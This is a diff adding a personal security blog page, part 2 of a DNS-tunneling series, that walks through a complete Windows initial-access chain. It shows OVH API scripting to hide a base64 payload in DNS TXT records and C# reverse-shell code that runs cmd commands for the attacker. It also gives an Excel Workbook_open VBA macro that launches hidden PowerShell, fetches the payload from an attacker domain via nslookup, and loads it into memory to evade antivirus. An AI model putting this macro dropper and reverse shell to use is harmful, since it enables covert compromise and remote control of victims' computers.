@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>DNS Tunneling P.2</title>
+        <link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="../css/styles.css" rel="stylesheet" />
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-xl navbar-dark bg-primary fixed-top" id="sideNav">
+            <a class="navbar-brand js-scroll-trigger" href="../index.html">
+                <span class="d-block d-xl-none">Olivier LEUNG</span>
+                <span class="d-none d-xl-block"><img class="img-fluid img-profile rounded-circle mx-auto mb-2" src="../assets/img/profile.jpg" alt="" /></span>
+            </a>
+            <div class="d-none d-xl-block description_profile"> <!--d-none is used for responsiveness of the panel when you shring the window -->
+                <h3>Olivier LEUNG</h3>
+                <div class="subheading_panel">Cybersecurity engineer </div>
+                    <div class="subheading_description">Love testing random cyber stuff !<br>That's by baking we become a baker</div>
+            </div>
+            <!-- button collapse panel when small windows, responsive pane -->
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button> 
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav">
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../ctfpage.html">CTF</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../dfirpage.html">DFIR</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../vulnpage.html">Vuln Exploitation</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../malwarepage.html">Malware Analysis</a></li>
+                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../tutorialpage.html">Tutorial</a></li>
+                </ul>
+            </div>
+
+            <div class="d-none d-xl-block social-icons">
+                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/in/olivierleung"><i class="fab fa-linkedin-in"></i></a>
+                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://github.com/SkallZou"><i class="fab fa-github"></i></a>
+                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://twitter.com/olivier_leung"><i class="fab fa-twitter"></i></a>
+            </div>
+        <footer class="d-none d-xl-block">
+            <div class="container">
+              <p class="m-1 text-center footerpage">Copyright &copy; 2023 Olivier Leung<br>All rights reserved.</p>
+            </div>
+        </footer>
+        </nav>
+        <!-- Page Content-->
+        <div>
+            <nav class="navbar navbar-expand-xl navbar-dark bg-header sticky-top">
+            <h3 class="header-article"><a href="../vulnpage.html">Vulnerability Exploitation </a>> DNS Tunneling P.2</h3>
+            </nav>
+            <section class="article">
+                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
+                    <div class="flex-grow-1">
+                            <p>
+                                We have previously work locally to understand the concept of DNS tunneling (<a href="https://skallzou.github.io/vuln/dnstunneling.html">DNS Tunneling P.1</a>).
+                                This second part of the DNS tunneling series will show how to exploit the DNS to open a reverse shell when the VBA macro is executed on the victim system. The issue in the previous part is that the domain name wasn’t reachable from the internet. The test was made locally. In this case, we will buy a domain from a domain registrar so that our domain is reachable by anyone sending a DNS query to our server. <br>
+                                <br>
+                                So the first thing to do is to buy a domain on a domain registrar such as GoDaddy or OVH and configure the domain to store the payload inside. <br>
+                                As we know, we will store a big amount of string in the DNS server, but since that TXT records can only store 255 characters, we need to automate the task to create DNS entries. <br>
+                                To automate the creation of DNS entry, one classic choice is to play with the API. <br>
+                                <br>
+                                <h4>OVH API</h4>
+                                OVH has a documentation that explains how to use their API, and they suggest to install their library. For those people using python, installing their library will make the task easier. Here is the link for the OVH documentation in python (https://github.com/ovh/python-ovh).  
+                                Since that I want to stay on PowerShell, we will need to understand how the API works, and check what it returns after a request.
+
+                                An authorization is needed before any API request. To get the right, we need to generate an application key, application SECRET, and customer key.
+
+                                Those keys and secrets can be obtained in the following URL : https://www.ovh.com/auth/api/createToken
+
+                                Then you will be asked to add the different rules that authorize your application to make an API request on a specific resource. 
+
+                                The API also has a console that let you try some requests and see the result in a graphic interface (https://api.ovh.com/console). Log in with your account, and set the authorization for the usage in the graphical interface.
+
+                                <img src="img/dnstunneling2/ovhconsole.jpg" class="img-fluid" width="600">
+
+                                Select the resource you want to take a look, for example I have chosen “/domain/zone/{zoneName}/record to get the id of my record which is necessary to get the information about the DNS record. As you can see on the screenshot below, the resource /domain/zone/{zoneName}/record/{id}, you need to get the “ID” to be able to get the object property.
+
+                                <img src="img/dnstunneling2/zoneid.jpg" class="img-fluid" width="900">
+
+                                The interesting part is not the result, but the raw request because we want to know what information we need to put in the header of our web request.
+
+                                <img src="img/dnstunneling2/apirequest.jpg" class="img-fluid" width="900">
+
+                                The API server wait a request that is composed with the following information in the header:
+                                <ul>
+                                    <li>X-Ovh-Application</li>
+                                    <li>X-Ovh-Consumer</li>
+                                    <li>X-Ovh-Signature</li>
+                                    <li>X-Ovh-Timestamp</li>
+                                </ul>
+                                Using PowerShell, to make a web request, we can use Invoke-WebRequest. This cmdlet can have different parameters such as Method that takes GET or POST or PUT another webmethod. The parameter Headers is where X-Ovh-Application, X-Ovh-Consumer, X-Ovh-Signature and X-Ovh-Timestamp will be placed. <br>
+
+                                <div class="squarebox">
+                                    Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY
+                                </div>
+
+                                Content-type, you can either put in the header or directly in the parameter also called Content-Type. <br>
+                                Timestamp is UNIX time (epoch time). <br>
+                                <br>
+                                According to the OVH API document, the signature is the SHA1 of the concatenation of application secret, customer key, request method, the query, body and timestamp and $1$ in the beginning of the string. <br>
+                                <br>
+                                The URI is https://api.ovh.com/[RESOURCE] <br>
+                                Once we have all this information, we can send a web request to the resource. If that’s a valid request, the web status code is 200.
+
+                                Here are the element we need to have for the web request:
+                                <ul>
+                                    <li>QUERY (API resource)</li>
+                                    <li>METHOD (POST/GET/PUT…)</li>
+                                    <li>BODY (sometimes its empty)</li>
+                                    <li>SIGNATURE ($1$ + SHA1(Application Secret + Consumer Key + Method + Query + Body + Time)</li>
+                                </ul>
+
+                                <h4>C# reverse shell</h4>
+                                We know the offensive capabilities when using .NET application. PowerShell can call C# binary by using reflection assembly. That’s the main reason we will build the reverse shell in C# in order to execute in memory and potentially avoid antivirus detection. <br>
+                                A reverse shell is when the victim system initiates an outgoing connection and establishes a shell session. If the attacking system initiates the connection, it would called a bind shell, a bind shell will be certainly blocked by the firewall or generate alert because the victim system is receiving a lot of incoming traffic from internet on a specific port. Also in many situations, the victim system is not publicly accessible, the public IP is provided by the Internet access provider and the public IP is usually shared with many private IP address. Those systems are NAT protected and a home address is usually NAT protected. <br>
+                                <br>
+                                When the victim system executes a malware that instantiates a reverse shell with the attacker machine, it initiates an outgoing connection to the attacker command and control server. Most of firewall do not filter on outgoing traffic but incoming traffic. And if server listen on port 443, you can be sure that the firewall is not blocking this port otherwise the user will not be able to go on HTTPS webpage. <br>
+                                <br>
+                                To establish a connection in C#, we are using the library System.Net.Sockets to create an object of the class TcpClient(). This class has a method called Connect($hostname, $port) to establish a connection to the IP address and the port. <br>
+                                <div class="squarebox">
+                                    using (var tcp = new TcpClient()) { <br>
+                                &emsp;&emsp;tcp.Connect(hostname, port); <br>
+                                    }
+                                </div>
+
+                                PowerShell and C# are very similar. To send message to another system, a stream must be initialiazed where the message will go through, and any object from TcpClient() class has a method GetStream(), where you can use the function Write() to send message in that stream of the established connection. To read the message from the stream, you need a translator, and the class StreamReader($stream) fill exactly this position.
+
+                                <div class="squarebox">
+                                    using (var stream = client.GetStream()) { <br>
+                                    &emsp;stream.Write(“Hello World”)
+                                    &emsp;using (var streamReader = new StreamReader(stream)) { <br>
+                                    &emsp;&emsp;string message = streamReader.ReadLine(); <br>
+                                    &emsp;} <br>
+                                    }
+                                </div>
+                                Now that the connection is setup, and we know how to send and receive message. Let’s think about what we should receive from the victim perspectives or what to send if we are attacking. Having a reverse shell means that we want to have a console and potentially executing shell command. Shell command usually has the following format : command arg1 arg2. <br>
+                                Therefore we need to split the message with space and indicate that the first element of the array is the command and the rest are the argument. <br>
+                                <div class="squarebox">
+                                    string[] parts = message.Split(' '); <br>
+                                    string command = parts.First(); <br>
+                                    string[] arguments = parts.Skip(1).ToArray();
+                                </div>
+                                For every command that the attacker is entering, it will start a process in the victim machine. For example, if the attacker executes the command “whoami”, the victim machine will execute cmd /c “whoami” and send the response to the attacker. To send the response back to the attacker, the process must forward the standard output to the stream, therefore in the process information, the parameter startInfo.RedirectStandardOutput must be set to true. Creating a process in C# can be easily done with an object of the class Process() that is found in the library System.Diagnostic. <br>
+                                <br>
+                                With the function StandardOutput.BaseStream.CopyTo(stream), when the process is writing on the standard output, it will also copy the output to the stream and the attacker system can receive the output on his console.
+                                <div class="squarebox">
+                                    ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe" , "/c " + command + " " +  string.Join(" ", arguments)); <br>
+                                    startInfo.WorkingDirectory = @"C:\"; <br>
+                                    startInfo.RedirectStandardError = true; <br>
+                                    startInfo.RedirectStandardOutput = true; <br>
+                                    Process process = new Process(); <br>
+                                    process.StartInfo = startInfo; <br>
+ <br>
+                                    try <br>
+                                    { <br>
+                                    &emsp;process.Start(); <br>
+                                    &emsp;process.StandardOutput.BaseStream.CopyTo(stream); <br>
+                                    &emsp;process.StandardError.BaseStream.CopyTo(stream); <br>
+                                    &emsp;process.WaitForExit(); <br>
+                                    } <br>
+                                    catch (Exception e) <br>
+                                    { <br>
+                                    &emsp;Console.WriteLine("[!] Error executing : " + command); <br>
+                                    &emsp;messageSrv = "Error executing : " + command + " => " + e.Message + "\r\n"; <br>
+                                    &emsp;stream.Write(Encoding.ASCII.GetBytes(messageSrv), 0, messageSrv.Length); <br>
+                                    }
+                                </div>
+                                <h4>VBA macro</h4>
+                                A VBA macro in a excel file as a entrypoint is a common way for attacker to perform the initial access to the victim system. Using a subroutine called Workbook_open(), the subroutine will automatically run when the workbook is opened and if the user has enabled to run macro. <br>
+                                <br>
+                                The object WScript.Shell provides access to OS shell methods. Run() method allows to run an application using VBA. By default in Windows, PowerShell is in the environment path of every Windows system, therefore typing PowerShell.exe will execute powershell.exe on the victim system. <br>
+                                <div class="squarebox">
+                                    arg = "For($i=0;$i -lt 35;$i++){$temp=(nslookup -retry=50 -timeout=1 -q=TXT $i'" & domain & "')[-1];$result=$result+$temp};$result" <br>
+                                    PScmd = "powershell -command " & arg & "|clip"; <br>
+                                    CreateObject("WScript.Shell").Run PScmd, 0, True;   
+                                </div>
+                                The Run() method got 3 parameters :
+                                <ul>
+                                    <li>String Command</li>
+                                    <li>Int WindowsStyle</li>
+                                    <li>Bool WaitOnReturn</li>
+                                </ul>
+
+                                WindowsStyle is set to 0 to hide the windows <br>
+                                WaitOnReturn is set to true to complete the command before executing the rest of the command. <br>
+                                <br>
+                                In Windows, a COM object (Component Object Model) is a system that authorizes an object to interact and communicate with another object such as a binary. The Windows Registry contains a set of keys that enables the system to do the mapping between the COM object and the CLSID (HKEY_CLASSES_ROOT\CLSID\{ID}). For example, the COM with the CLSID “1C3B4210-F441-11CE-B9EA-00AA006B1A69”  is responsible for copy data to the clipboard, and has a reference to Microsoft.Vbe.Interop.Forms.dll <br>
+
+                                <img src="img/dnstunneling2/registrycom.jpg" class="img-fluid" width="900">
+
+                                Piping the powershell command with clip.exe send the output of the PS command stored in arg to the input of the process clip.exe <br>
+                                Creating a COM object gives us access to the methods of the class. Since the COM object is linked to Microsoft.Vbe.Interop.Forms.dll, we have access to the class and it is possible to call the GetFromClipboard() method to get the value stored in the clipboard. <br>
+
+                                <div class="squarebox">
+                                With CreateObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}") <br>
+                                &emsp;.GetFromClipboard <br>
+                                &emsp;output_clipboard = .GetText(1) <br>
+                                End With
+                                </div>
+
+
+                                We can store this value of the clipboard in a variable with GetText(). <br>
+                                The variable is storing the base64 payload from all the nslookup done previously. As expected, it is necessary to remove some tabulations, quotes, to make it as a real base64 value. <br>
+
+                                <div class="squarebox">
+                                    output_clipboard = Replace(output_clipboard, Chr$(9), vbNullString) <br>
+                                    output_clipboard = Replace(output_clipboard, Chr(34), vbNullString) <br>
+                                    output_clipboard = Replace(output_clipboard, vbNewLine, vbNullString) <br>
+                                    output_clipboard = Replace(output_clipboard, vbCrLf, vbNullString)  <br>
+                                </div>
+
+                                Once done, we can execute the PowerShell by calling another Wscript.Shell Run().
+
+                                <div class="squarebox">
+                                    PScmd = "powershell.exe -NoExit -WindowStyle hidden -command $b64='" & output_clipboard & "';Write-Host $b64;$bytes=[System.Convert]::FromBase64String($b64);$assembly=[System.Reflection.Assembly]::Load($bytes);$assembly.EntryPoint.Invoke($null,$null);"
+                                </div>
+                                <br>
+                                <h4>Demo</h4>
+
+                            <video width="70%" style="max-width: 100%; height: auto; display: block;" muted autoplay loop>
+                                <source src="img/dnstunneling2/vbadnstunneling.mp4" type="video/mp4">
+                                    Your browser does not support the video tag
+                            </video>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Third party plugin JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
